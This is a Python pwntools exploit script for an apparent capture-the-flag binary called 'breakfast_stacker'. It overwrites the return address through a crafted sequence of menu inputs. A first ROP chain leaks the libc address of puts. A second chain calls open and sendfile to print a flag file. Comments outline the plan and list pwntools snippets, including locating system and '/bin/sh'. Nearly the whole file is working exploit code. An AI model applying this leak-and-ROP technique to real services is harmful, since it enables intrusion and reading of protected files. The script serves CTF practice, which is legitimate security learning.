#!/usr/bin/python3
from pwn import *
import re 
import sys
import itertools

# connection parameter setup
context.terminal = ["tmux","splitw","-v"] 
context.update(log_level='debug')

# run parameters
DEBUG = True
PRELOAD = False


def main():
    # setup the process  
    if DEBUG:
        args = ["./breakfast_stacker"] 
        if(PRELOAD):
            libc_loc = "./libc-2.27.so" 
            p = process(args, env={"LD_PRELOAD": libc_loc})
        else:
            p = process(args) 
    else:
        p = remote(HOST, PORT) 

    
    def parse_menu():
        p.recvuntil("(p, w):\n") 

    def make_pancake(name=""):
        parse_menu() 
        p.sendline("p")
        p.recvuntil("Bananas\n")
        p.sendline("1")
        p.recvuntil("name!)\n")
        p.sendline(name) 
        return 0

    def make_waffle(name=""):
        parse_menu()
        p.sendline("w")
        p.recvuntil("Bananas\n")
        p.sendline("1")
        p.recvuntil("name!)\n")
        p.sendline(name) 
        return 0 

    def eat_food(action="s"):
        action
        p.recv(4096)
        p.sendline(action)

    def overwrite_rip(payload=b"",num=1):
        # 1 Good Bard
        make_pancake("")

        # 7 Evil Bards
        [make_waffle("") for i in range(7)]

        # 1 Evil Bard (no write)
        make_waffle("") 

        # 1 Good Bard (rip overwrite) 
        make_pancake(payload) 

        [eat_food() for i in range(10)]



    # Plan
    # Bard:
    # 1Good + 7Evil + 1Evil (write nothing) + 1Good (write rip) = RIP write for 32 bytes 
    #  
    # 1 Main:
    # pop rdi 
    # addr of printf
    # call puts
    # calculate libc
    # go to Main
    #
    # 2nd Main:
    # Magic Gadget 
    #
    context.clear(arch='amd64') 
    elf = ELF(p.executable) 
    libc = elf.libc

    # ====== FIRST PAYLOAD ===== #
    rop = ROP(elf)
    payload = b""  
    payload += p64( rop.find_gadget(["pop rdi","ret"]).address ) #pop rdi
    payload += p64( elf.got['puts'] ) # addr of puts
    payload += p64( elf.symbols['main'] + 0x16) # jump back to main  

    # ====== FIRST MAIN PASS ====== #
    overwrite_rip(payload)
    p.recvuntil("dissinegrates.\n\n") 
    leak = p.recv(6)
    leak = u64(leak.ljust(8,b"\x00")) - libc.symbols['puts']
    print(f"LEAK: {hex(leak)}")
    #gdb.attach(p,"""""") 
    #import ipdb; ipdb.set_trace() 
    
    # ====== SECOND MAIN PASS ===== #
    libc.address = leak 
    librop = ROP(libc)
    h_addr = next(libc.search(b"h\0"))
    librop.call("open", [h_addr, 0])
    librop.call("sendfile", [1, 3, 0, 1024])
    print(librop.dump()) 
    payload = librop.chain() 
    print(payload) 
    print(len(payload))
    
    overwrite_rip(payload) # one gadget 
    flag = p.readall()
    print(flag) 

    # Useful commands:
    # ============================
    # 
    #   LIBC & ELF Manipulation
    #   =======================
    #   libc = ELF("./libc-generic.so")
    #   elf = ELF("./generic_binary")
    #   elf.got['function'] #-> returns addr
    #   system = libc.symbols['system'] #-> returns addr of symbol
    #   binsh = libc.search('/bin/sh').next() #-> returns addr of str
    #   
    #   Proccess Manip & DBG
    #   =======================        
    #   gdb.attach(p, '''   #attach to the proc, p
    #       set follow-fork-mode child
    #       break *0x08048099
    #       continue
    #       ''')
    #                       
    #   p.sendline(line)
    #   p.recv(1024) 
    #   p.revcuntil("thing")
    #   p.sendlineafter("recved", "wanttosend")
    #   
    #   Pretty Printing & Bytes
    #   =======================    
    #   p64(0xdeadbeef) #int to bytes
    #   u64("\xef\xbe\xad\xde") #bytes to int
    #   log.success("string")
    #   log.info("string")

if __name__ == '__main__':
    main()         
